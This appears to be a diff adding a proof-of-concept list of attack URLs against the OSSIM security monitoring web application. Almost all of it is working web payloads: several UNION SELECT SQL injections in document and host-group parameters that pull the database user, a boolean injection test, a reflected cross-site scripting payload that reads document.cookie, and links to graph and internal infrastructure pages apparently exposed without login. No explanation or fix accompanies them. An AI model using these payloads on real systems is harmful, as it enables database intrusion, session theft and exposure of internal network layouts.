@@ -1,0 +1,20 @@
+http://www.example.com/ossim/repository/repository_document.php?id_document=-3 union select 1,2,user(),4,5,6--&amp;maximized=1&amp;search_bylink=&amp;pag=1
+
+http://www.example.com/ossim/repository/repository_links.php?id_document=-3 union select 1,user(),3,4,5,6
+
+http://www.example.com/ossim/repository/repository_editdocument.php?id_document=-3 union select 1,user(),3,4,5,6
+
+http://www.example.com/ossim/policy/getpolicy.php?group=0 and 1=1
+
+http://www.example.com/ossim/host/newhostgroupform.php?name=&#039; union select user(),&#039;b&#039;,&#039;c&#039;,&#039;d&#039;,&#039;f
+
+http://www.example.com/ossim/net/modifynetform.php?name=&#039; union select user(),&#039;b&#039;,&#039;c&#039;,&#039;d&#039;,&#039;e&#039;,&#039;f&#039;,&#039;g&#039;,&#039;h&#039;,&#039;a
+
+http://www.example.com/ossim/?option=0&quot; onload=alert(document.cookie) a=&quot;
+
+Access to the graph:
+http://www.example.com/ossim/graphs/alarms_events.php
+
+Internal infrastructure view:
+http://www.example.com/ossim/host/draw_tree.php
+
